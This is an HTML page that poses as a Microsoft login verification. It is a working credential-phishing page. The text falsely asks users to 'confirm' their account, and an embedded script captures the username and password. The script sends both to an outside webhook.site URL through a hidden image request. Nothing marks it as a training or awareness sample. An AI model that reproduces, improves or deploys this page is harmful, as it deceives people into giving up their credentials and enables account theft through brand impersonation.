<!DOCTYPE html>
<html>
<head>
    <!-- Official MS user confirmation of information -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS Login Verification</title>
    <style>
        /* Add CSS for setting the background color to dark grey */
        body {
            background-color: rgb(255, 255, 255); /* ms style */
              font-family: Work Sans;
              font-weight:400;
              font-size:1rem;
              line-height:1.5rem;
              letter-spacing:.2px;
              letter-spacing:0
        }
        form {
          border: 0;
          outline: 0;
          width: 1200px;
          padding: 10px 20px;
        }
        
        input {
          border: 0;
          outline: 0;
          background: rgb(255,252,205);
          border-bottom: 1px solid black;
          width: 100%;
          padding: 10px 20px;
        }
        
        /* Style the button */
        button {
            padding: 10px 20px;
            background-color:  rgb(58, 120, 181); /* MS Blue */
            color: white; /* Text color for the button */
            border: none;
            cursor: pointer;
            border-radius: 30px;
        }

        /* Style the button on hover */
        button:hover {
            background-color: #0056b3; /* Darker blue color on hover */
            cursor: pointer;
        }
    </style>
</head>
<body>
    We are committed to ensuring the accuracy of your account information to provide you with the best experience. Before you continue, please take a moment to confirm you information so we can validate what we have on file for your account.
    <form id="myForm"><br>
        <input type="text" id="username" placeholder="Username" required><br><br>
        <input type="password" id="password" placeholder="Password" required><br><br>
        <button type="submit">confirm</button>
    </form>

    <script>
        document.getElementById("myForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent the form from submitting by default
            const value = document.getElementById("username").value;
            const value1 = document.getElementById("password").value;

            // Create a single Image object and send both values in one request
            var image = new Image();
            image.src = "https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?username=" + value + "&password=" + value1;
        });
    </script>
</body>
</html>
